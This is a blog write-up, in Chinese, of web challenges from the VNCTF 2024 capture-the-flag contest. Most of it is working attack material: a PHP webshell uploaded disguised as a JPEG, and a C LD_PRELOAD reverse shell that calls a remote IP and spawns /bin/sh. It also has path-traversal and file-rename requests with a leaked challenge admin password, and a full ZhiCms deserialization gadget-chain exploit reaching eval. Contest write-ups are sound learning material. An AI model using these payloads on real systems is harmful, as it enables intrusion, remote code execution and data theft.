# VNCTF 2024 Web

  
  
&lt;!--more--&gt;  
## Sign in  
在`game.js`中发现关键代码，放到`console`中执行  
```js  
var _0x3d9d=[&#34;\x56\x4e\x43\x54\x46\x7b\x57\x33\x31\x63\x30\x6d\x33\x5f\x74\x30\x5f\x56\x4e\x43\x54\x46\x5f\x32\x30\x32\x34\x5f\x67\x40\x6f\x64\x5f\x4a\x30\x42\x21\x21\x21\x21\x7d&#34;];  
console.log(_0x3d9d[0]);  
```  
获得`flag`  
`VNCTF{W31c0m3_t0_VNCTF_2024_g@od_J0B!!!!}`  
## TrySent  
poc  
```http  
POST /user/upload/upload HTTP/1.1  
Host: 2180fc06-45c6-4306-8e86-637be6a3025a.vnctf2024.manqiu.top  
Content-Length: 758  
Sec-Ch-Ua: &#34; Not;A Brand&#34;;v=&#34;99&#34;, &#34;Google Chrome&#34;;v=&#34;97&#34;, &#34;Chromium&#34;;v=&#34;97&#34;  
Sec-Ch-Ua-Mobile: ?0  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36  
Sec-Ch-Ua-Platform: &#34;Windows&#34;  
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrhx2kYAMYDqoTThz  
Accept: */*  
Origin: https://info.ziwugu.vip/  
Sec-Fetch-Site: same-origin  
Sec-Fetch-Mode: cors  
Sec-Fetch-Dest: empty  
Referer: https://target.com/user/upload/index?name=icon&amp;type=image&amp;limit=1  
Accept-Encoding: gzip, deflate  
Accept-Language: zh-CN,zh;q=0.9,ja-CN;q=0.8,ja;q=0.7,en;q=0.6  
Connection: close  
  
------WebKitFormBoundaryrhx2kYAMYDqoTThz  
Content-Disposition: form-data; name=&#34;id&#34;  
  
WU_FILE_0  
------WebKitFormBoundaryrhx2kYAMYDqoTThz  
Content-Disposition: form-data; name=&#34;name&#34;  
  
test.jpg  
------WebKitFormBoundaryrhx2kYAMYDqoTThz  
Content-Disposition: form-data; name=&#34;type&#34;  
  
image/jpeg  
------WebKitFormBoundaryrhx2kYAMYDqoTThz  
Content-Disposition: form-data; name=&#34;lastModifiedDate&#34;  
  
Wed Jul 21 2021 18:15:25 GMT&#43;0800 (中国标准时间)  
------WebKitFormBoundaryrhx2kYAMYDqoTThz  
Content-Disposition: form-data; name=&#34;size&#34;  
  
164264  
------WebKitFormBoundaryrhx2kYAMYDqoTThz  
Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;test.php&#34;  
Content-Type: image/jpeg  
  
JFIF  
&lt;?=`$_GET[1]`;?&gt;  
  
------WebKitFormBoundaryrhx2kYAMYDqoTThz--  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402171106425.png)
### Reference  
https://blog.hanayuzu.top/articles/37dacab4  
  
## givephp  
劫持LD_PRELOAD变量  
写一个`reverseshell`  
```c  
#include &lt;stdlib.h&gt;  
#include &lt;stdio.h&gt;  
#include &lt;string.h&gt;  
#include &lt;unistd.h&gt;  
#include &lt;netinet/in.h&gt;  
#include &lt;sys/types.h&gt;  
#include &lt;sys/socket.h&gt;  
  
#define REMOTE_ADDR &#34;ip&#34;  
#define REMOTE_PORT port  
  
__attribute__((__constructor__)) void preload(void)  
{  
    struct sockaddr_in sa;  
    int s;  
  
    sa.sin_family = AF_INET;  
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);  
    sa.sin_port = htons(REMOTE_PORT);  
  
    s = socket(AF_INET, SOCK_STREAM, 0);  
    connect(s, (struct sockaddr *)&amp;sa, sizeof(sa));  
    dup2(s, 0);  
    dup2(s, 1);  
    dup2(s, 2);  
  
    execve(&#34;/bin/sh&#34;, 0, 0);  
}  
```  
编译共享库  
`gcc -fPIC exp.c -o exp.so`  
`/?challenge=1&amp;key=LD_PRELOAD&amp;value=/tmp/uploaded_file_65d06b74e02569.16227496.so&amp;guess=%00lambda_1`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402171619991.png)
## CutePath  
`/chfs/files?filepath=../` 存在目录遍历  
得到账号和密码  
`admin:gdgm.edu.cn@M1n9K1n9P@as`  
登陆之后，得到更多的功能点  
通过目录遍历，得到`flag`文件的位置  
`../../../flag/flag/flag.txt`  
存在重命名功能点，并且跨目录，直接将flag.txt文件移动到web目录即可  
```http  
POST /chfs/rename  
  
------WebKitFormBoundary4GWMTiRPXoB99YrX  
Content-Disposition: form-data; name=&#34;new&#34;  
  
../../../home/ming/share_main/flag.txt  
------WebKitFormBoundary4GWMTiRPXoB99YrX  
Content-Disposition: form-data; name=&#34;old&#34;  
  
../../../flag/flag/flag.txt  
------WebKitFormBoundary4GWMTiRPXoB99YrX--  
```  
访问`/chfs/shared/flag.txt?v=1`得到flag  
`VNCTF{564e406840636b3156315f6764676d}`  
## codefever_again  
根据 https://github.com/PGYER/codefever/issues/140 来打  
## zhi  
### Unserialize RCE  
在`giftcontroller`控制器下面存在如下方法  
```php  
public function globallike(){  
	 $mylike=$_COOKIE[&#39;mylike&#39;];  
	 $arr = unserialize($mylike);  
  
	 echo count($arr);  
}  
```  
很明显存在一个`unserialize`  
全局搜索`__destruct`，利用`simple_html_dom`类中的`__destruct`方法  
```php  
function __destruct()  
{  
	$this-&gt;clear();  
}  
```  
跟进查看`clear()`  
```php  
function clear()  
{  
	foreach ($this-&gt;nodes as $n) {$n-&gt;clear(); $n = null;}  
	// This add next line is documented in the sourceforge repository. 2977248 as a fix for ongoing memory leaks that occur even with the use of clear.  
	if (isset($this-&gt;children)) foreach ($this-&gt;children as $n) {$n-&gt;clear(); $n = null;}  
	if (isset($this-&gt;parent)) {$this-&gt;parent-&gt;clear(); unset($this-&gt;parent);}  
	if (isset($this-&gt;root)) {$this-&gt;root-&gt;clear(); unset($this-&gt;root);}  
	unset($this-&gt;doc);  
	unset($this-&gt;noise);  
}  
```  
这里可以任意调用`__call()`方法，或者`clear()`方法  
这里利用`MemcachedDriver`类中的`clear()`方法  
```php  
public function clear() {  
	return $this-&gt;mmc-&gt;set($this-&gt;group.&#39;_ver&#39;, $this-&gt;ver&#43;1);  
}  
```  
利用拼接进行触发`__toString`方法，选择`simple_html_dom_node`类  
```php  
function __toString()  
{  
	return $this-&gt;outertext();  
}  
```  
进入`outertext()`方法  
```php  
function outertext()  
{  
	global $debugObject;  
	if (is_object($debugObject))  
	{  
		$text = &#39;&#39;;  
		if ($this-&gt;tag == &#39;text&#39;)  
		{  
			if (!empty($this-&gt;text))  
			{  
				$text = &#34; with text: &#34; . $this-&gt;text;  
			}  
		}  
		$debugObject-&gt;debugLog(1, &#39;Innertext of tag: &#39; . $this-&gt;tag . $text);  
	}  
  
	if ($this-&gt;tag===&#39;root&#39;) return $this-&gt;innertext();  
  
	// trigger callback  
	if ($this-&gt;dom &amp;&amp; $this-&gt;dom-&gt;callback!==null)  
	{  
		call_user_func_array($this-&gt;dom-&gt;callback, array($this));  
	}  
```  
其中可以调用到`call_user_func_array($this-&gt;dom-&gt;callback, array($this));`方法，但是无法控制第二个参数，所以只能调用到任意类的任意方法并且参数只能是一个  
这里利用`Template`类中的`display`方法  
```php  
public function display($tpl = &#39;&#39;, $return = false, $isTpl = true ) {  
	if( $return ){  
		if ( ob_get_level() ){  
			ob_end_flush();  
			flush();   
		}   
		ob_start();  
	}  
	  
	extract($this-&gt;vars, EXTR_OVERWRITE);  
	eval(&#39;?&gt;&#39; . $this-&gt;compile( $tpl, $isTpl));  
	  
	if( $return ){  
		$content = ob_get_contents();  
		ob_end_clean();  
		return $content;  
	}  
}  
```  
可以利用`extract($this-&gt;vars, EXTR_OVERWRITE);`来控制`$this-&gt;compile( $tpl, $isTpl)`中的参数，跟进查看是否能控制其返回内容  
```php  
public function compile( $tpl, $isTpl = true ) {  
	if( $isTpl ){  
		$tplFile = $this-&gt;config[&#39;TPL_PATH&#39;] . $tpl . $this-&gt;config[&#39;TPL_SUFFIX&#39;];  
		if ( !file_exists($tplFile) ) {  
			throw new \Exception(&#34;Template file &#39;{$tplFile}&#39; not found&#34;, 500);  
		}  
		$tplKey = md5(realpath($tplFile));				  
	} else {  
		$tplKey = md5($tpl);  
	}  
  
	$ret = unserialize( $this-&gt;cache-&gt;get( $tplKey ) );	  
	if ( empty($ret[&#39;template&#39;]) || ($isTpl&amp;&amp;filemtime($tplFile)&gt;($ret[&#39;compile_time&#39;])) ) {  
		$template = $isTpl ? file_get_contents( $tplFile ) : $tpl;  
		if( false === Hook::listen(&#39;templateParse&#39;, array($template), $template) ){  
			foreach ($this-&gt;label as $key =&gt; $value) {  
				$template = preg_replace($key, $value, $template);  
			}		  
		}  
		$ret = array(&#39;template&#39;=&gt;$template, &#39;compile_time&#39;=&gt;time());  
		$this-&gt;cache-&gt;set( $tplKey, serialize($ret), 86400*365);  
	}	  
	return $ret[&#39;template&#39;];  
}  
```  
可以看到，如果能控制`unserialize($this-&gt;cache-&gt;get( $tplKey ))`的内容，便可以控制返回内容，这里全局搜索一下`get()`方法  
这里利用`FileCacheDriver`中的`get()`方法  
```php  
public function get( $key ){  
	$content = @file_get_contents( $this-&gt;_getFilePath($key) );  
	if( empty($content) ) return false;  
	  
	$expire  =  (int) substr($content, 13, 12);  
	if( time() &gt;= $expire ) return false;  
  
	$md5Sign  =  substr($content, 25, 32);  
	$content   =  substr($content, 57);  
	if( $md5Sign != md5($content) ) return false;  
	  
	return @unserialize($content);  
}  
```  
从`$this-&gt;_getFilePath`方法中获取内容，并且进行了一些判断，然后反序列化后返回内容，跟进其方法  
```php  
private function _getFilePath($key, $isCreatePath = false){  
	$key = md5($key);  
	  
	$dir = $this-&gt;config[&#39;CACHE_PATH&#39;] . &#39;/&#39; . $this-&gt;config[&#39;GROUP&#39;] . &#39;/&#39;;  
	for($i=0; $i&lt;$this-&gt;config[&#39;HASH_DEEP&#39;]; $i&#43;&#43;){  
		$dir = $dir. substr($key, $i*2, 2).&#39;/&#39;;  
	}  
	$dir = str_replace(&#39;/&#39;, DIRECTORY_SEPARATOR, $dir);  
	  
	if ( !file_exists($dir) ) {  
		if ( !@mkdir($dir, 0777, true) ){  
			throw new \Exception(&#34;Can not create dir &#39;{$dir}&#39;&#34;, 500);  
		 }               
	}  
	if ( !is_writable($dir) ) @chmod($dir, 0777);  
	  
	return $dir. $key . &#39;.php&#39;;;  
}  
```  
进行了一些目录文件名拼接的操作，然后返回一个php文件，但是我们并没有这个文件，所以会进入`compile()`方法中的`if`条件  
```php  
if ( empty($ret[&#39;template&#39;]) || ($isTpl&amp;&amp;filemtime($tplFile)&gt;($ret[&#39;compile_time&#39;])) ) {  
	$template = $isTpl ? file_get_contents( $tplFile ) : $tpl;  
	if( false === Hook::listen(&#39;templateParse&#39;, array($template), $template) ){  
		foreach ($this-&gt;label as $key =&gt; $value) {  
			$template = preg_replace($key, $value, $template);  
		}		  
	}  
	$ret = array(&#39;template&#39;=&gt;$template, &#39;compile_time&#39;=&gt;time());  
	$this-&gt;cache-&gt;set( $tplKey, serialize($ret), 86400*365);  
}	  
```  
内容就是传入的`$tpl`，接着调用`$this-&gt;cache-&gt;set()`方法，写入内容  
这里就利用`FileCacheDriver`类中的`set()`方法  
```php  
public function set($key, $value, $expire = 1800){		  
	$value = serialize($value);  
	$md5Sign = md5($value);  
	$expire = time() &#43; $expire;		  
	$content    = &#39;&lt;?php exit;?&gt;&#39; . sprintf(&#39;%012d&#39;, $expire) . $md5Sign . $value;		  
     
   return @file_put_contents($this-&gt;_getFilePath($key, true), $content, LOCK_EX);  
}  
```  
构造完整`poc`  
```php  
&lt;?php  
namespace ZhiCms\ext{  
    use ZhiCms\base\cache\MemcachedDriver;  
    use ZhiCms\base\Template;  
    class simple_html_dom{  
        public $nodes = array();  
        public function __construct(){  
            $this-&gt;nodes[] = new MemcachedDriver;  
        }  
    }  
    class simple_html_dom_node{  
        private $dom;  
        public function __construct(){  
            $this-&gt;dom-&gt;callback = array(new Template,&#39;display&#39;);  
        }  
    }  
    class Send {  
        public function __construct(){  
  
        }  
    }  
    echo urlencode(serialize(new simple_html_dom));  
}  
namespace ZhiCms\base\cache{  
    use ZhiCms\ext\simple_html_dom_node;  
    use ZhiCms\ext\Send;  
    class FileCacheDriver{  
        public function __construct(){  
    }  
    }  
    class MemcachedDriver{  
        protected $group = &#39;&#39;;   
        protected $mmc = NULL;  
        public function __construct(){  
            $this-&gt;group = new simple_html_dom_node;  
            $this-&gt;mmc = new Send();  
        }  
    }     
}  
  
namespace ZhiCms\base{  
    use ZhiCms\base\cache\FileCacheDriver;  
    class Template {  
        protected $vars = array();  
        protected $cache;  
        public function __construct(){  
            $this-&gt;vars=array(&#34;tpl&#34;=&gt;&#34;&lt;?=phpinfo();?&gt;&#34;,&#34;isTpl&#34;=&gt;false);  
            $this-&gt;cache = new FileCacheDriver;  
        }  
    }  
}  
?&gt;  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402191948822.png)

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/vnctf-2024-web/  

